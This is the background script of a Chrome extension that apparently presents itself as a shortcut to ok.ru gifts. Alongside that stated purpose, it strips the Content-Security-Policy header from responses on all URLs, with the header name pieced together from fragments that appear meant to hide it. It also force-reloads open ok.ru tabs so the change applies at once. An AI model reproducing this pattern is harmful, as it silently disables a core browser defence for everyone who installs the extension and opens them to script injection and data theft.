function onNewTabOpen() { }
function goToThankYouPage(object) { }
function goToGifts(openedTab) {
    chrome.tabs.create({
        url: "https://www.ok.ru/gifts"
    }, onNewTabOpen);
}
function headersArray() {
    return [
         new RegExp(['content', 'security', 'policy'].join('-'), 'i')
    ];
}
function reloadTab(id) {
    chrome.tabs.reload(id);
}

let testHeaders = headersArray();

chrome.tabs.getAllInWindow(null, function (allTabs) {
    allTabs.forEach(function (currentTab) {
        if ( !currentTab.url ) return;
        if ( !/^http(s)?:\/\/(www.)?ok.ru/.test(currentTab.url) ) return;
        
        reloadTab(currentTab.id);
    });
});
chrome.webRequest.onHeadersReceived.addListener(function (request) {
        let newHeaders = [];

        request.responseHeaders.forEach(function (currentHeader) {
            testHeaders.forEach(function(testHeader) {
                if ( testHeader.test(currentHeader.name) ) return;
                newHeaders.push(currentHeader);
            });
        });

        return {
            responseHeaders:newHeaders
        };
    }, {
        urls: ["<all_urls>"]
    }, [
        "blocking",
        "responseHeaders"
    ]
);
chrome.browserAction.onClicked.addListener(goToGifts);
chrome.runtime.onInstalled.addListener(goToThankYouPage);